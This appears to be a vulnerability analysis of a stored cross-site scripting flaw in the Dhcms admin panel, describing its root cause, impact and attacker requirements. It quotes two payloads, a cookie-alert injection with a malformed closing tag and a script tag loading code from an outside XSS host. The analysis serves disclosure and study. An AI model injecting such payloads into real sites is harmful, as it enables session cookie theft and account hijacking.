Based on the provided content, here's an analysis of the vulnerability:

**Root Cause:**
The root cause is the lack of proper input sanitization in the Dhcms admin panel. Specifically, user-supplied input is directly inserted into the application's HTML without encoding or escaping.

**Weaknesses/Vulnerabilities Present:**
- **Stored Cross-Site Scripting (XSS):** The primary vulnerability is a stored XSS, where malicious JavaScript code is injected via the admin panel settings. This injected code is then stored in the database and executed when other users, particularly administrators, access the affected sections of the application.

**Impact of Exploitation:**
- **Cookie Theft:** An attacker can execute JavaScript to steal session cookies.
- **Account Hijacking:** By stealing cookies, attackers can hijack administrator sessions and gain full control over the application.
- **Malicious Actions:** The attacker can inject further malicious code, redirect users, or deface the website as a result of the stored XSS vulnerability
- **Data Manipulation:** Using administrator privileges, the attacker can modify, delete or insert data.

**Attack Vectors:**
- The attacker uses the administrative interface.

**Required Attacker Capabilities/Position:**
- The attacker needs to have administrator privileges to access the vulnerable admin panel and inject the malicious code.
-  The attacker needs to be able to log in to the admin panel at the given address (`http://localhost/dhcms/admin.php?r=admin/Index/index`).

**Technical details:**
- The attacker injects the JavaScript payload `"><script>alert(document.cookie)<script>` directly into a form input field.
- This payload, when stored and rendered by the browser, executes and displays an alert box containing the current user's cookies.
- The attacker also demonstrates the use of an external script injection using `"><script src=//xsspt.com/VZiWzL></script>`
